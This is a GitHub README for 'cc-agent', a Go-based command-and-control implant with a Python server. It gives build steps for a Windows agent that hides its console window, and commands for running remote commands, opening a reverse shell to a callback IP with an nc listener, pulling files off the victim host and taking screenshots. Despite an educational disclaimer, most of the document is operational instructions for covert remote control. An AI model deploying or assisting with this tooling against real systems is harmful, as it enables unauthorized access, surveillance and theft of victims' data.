# cc-agent
# Project Title: Go Reverse Shell Manager

## Overview

The Go Reverse Shell Manager is a comprehensive solution designed to facilitate remote command execution and management through a Go-based agent. This system allows for executing predefined or dynamic commands received from a server, with the capability to initiate a reverse shell session for in-depth interaction. This README provides an overview of the project, including setup instructions, usage examples, and important security considerations.

## Features

- **Remote Command Execution**: Execute commands received from a centralized server.
- **Reverse Shell Capability**: Open a reverse shell to a specified listener, allowing for interactive command execution.
- **Result Reporting**: Automatically sends the execution results of commands back to the server.
- **Hide Console Window**: Optionally runs without a visible console window to reduce footprint on the host system.
- **Download file on the remote host**: Download file from the host where the agent is running

## Installation

### Prerequisites

- Go (1.15 or newer)
- Python (3.6 or newer)
- Access to a server capable of hosting the Python-based command server

### Setup

1. **Clone the repository**:

```bash
   git clone https://github.com/JeanBonBeurre34/cc-agent.git
   cd cc-agent
```

2. **Build the agent**
Before building the agent you will need to replace in the code the serverUrl  with your endpoint configuration. TheserverURL is the endpoint of your C&C. You can use a dns name for both to faciliate ip rotation.
```go
var (
    mu               sync.Mutex
    isCommandRunning bool
    serverURL        = "http://192.168.56.101:5000"
)

```
Than you can build the agent.
```bash
go build -o go-agent.exe main.go
```

3. ** Start the C&C **
Ensure your Python environment is set up, then run:
```bash
python server.py
```
### Building with docker
To build the Go application using Docker, follow these steps:

1. Prepare the Dockerfile:
   Ensure the provided Dockerfile is placed in the root directory of your project. The Dockerfile includes instructions for building a Windows executable using cross-compilation.
2. Build the Docker Image:
Run the following command in your terminal to build the Docker image. This command builds the Go application as a Windows executable within a Docker container.
```bash
docker build -t agent-go .
```
3. Extract the Executable:
After building the image, extract the compiled Windows executable (myServiceAgent.exe) from the Docker container:
```bash
docker create --name temp-container agent-go
docker cp temp-container:/app/myServiceAgent.exe ./myServiceAgent.exe
docker rm temp-container
```
The exe binary will be copied on the local folder.

We automated most of the task in a single file for the unix fan: build.sh.
You just need to:
1. clone the repository locally
2. ensure to have docker up and running on the device with the Dockerfile available locally where you will be running the command
3. chmod the script: ```bash chmod +x build.sh```
4. run it ```bash ./build.sh```

## Executing Commands Remotely
The implant support the execution of remote command. You can execute the command and retrieve the result of the command.
Use the Python client to submit commands to the server:
```bash
python client.py --command "ipconfig"
```

To initiate a reverse shell session, submit the special "shell" command:
Replace the ip after the shell with your call back ip the port can be changed too.
```bash
python client.py --command "shell 192.168.56.101:4444"
```

Ensure you have a listener running on the specified port before initiating the reverse shell:
```bash
nc -lvp 4444
```

### Download file from the remote host
The C&C support downloading file from the remote host.
To initiate a file to be downloaded just specify the path to the file on the remote host and the filename:
```bash
python client.py --command "download c:\Users\vboxuser\Desktop\document.docx document.docx"
```
The file will be downloaded on the C&C server and stored on inside a local folder named received_file.

### Take a screenshot on the remote host
The C&C support taking a screenshot
To initiate take a screenshot just type:
```bash
python client.py --command "screenshot"
```
The file will be downloaded on the C&C server and stored on inside a local folder named received_file.

### Agent operation
The Go agent, once started, will periodically check the server for commands to execute. If the "shell" command is received, it will attempt to establish a reverse shell connection to the listener address.

## Security Considerations
** Warning: ** This system allows for remote command execution, which carries significant security risks. Use it responsibly and only in environments where you have explicit authorization.
Recommendations:
        - Implement TLS for communication between the agent and the server.
        - Add authentication mechanisms to verify the identity of the command server and the agent.
        - Limit the network scope where possible to reduce exposure.
        - Regularly audit and monitor the system for unauthorized usage.

## Disclaimer and Liability
This project is provided for educational and research purposes only. It is not intended for malicious use or in any context where unauthorized access to computer systems is involved. The tools and techniques demonstrated can represent significant security risks; they should be used responsibly and only in legal and authorized contexts.

### Liability
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

By using this software, you acknowledge the potential impact it may have on systems and affirm that you have permission from relevant authorities or parties to use it in your context. The owner and contributors to this project assume no responsibility for unauthorized or illegal use of the tool, or for any damage caused by such use. It is the end user's responsibility to comply with all applicable local, state, national, and international laws.

## Debug the application
### Submit a Command
This command sends a new command to the server to be queued for execution.
```bash
curl -X POST http://localhost:5000/submit_command -H "Content-Type: application/json" -d "{\"cmd\": \"echo Hello, World!\"}"
```
### Fetch a Command
To fetch the next command from the queue (for simulation as the actual fetching is done by your Go service agent, not via curl):
```bash
curl http://localhost:5000/command
```

### Submit the Result of a Command
Assuming a command with ID 1 was executed and you want to submit its result back to the server:
```bash
curl -X POST http://localhost:5000/submit_result -H "Content-Type: application/json" -d "{\"id\": \"1\", \"result\": \"Command executed successfully\"}"

```

### Retrieve the Result of a Command
To get the result of a command execution, assuming the command had an ID of 1:
```bash
curl http://localhost:5000/result/1
```

### Build the go binary with visible windows not running in background only
Update the Dockerfile to remove the flag to hide the windows
```bash
RUN go build -o myServiceAgent.exe main.go
```
instead of 
```bash
RUN go build  -ldflags -H=windowsgui -o myServiceAgent.exe main.go
```
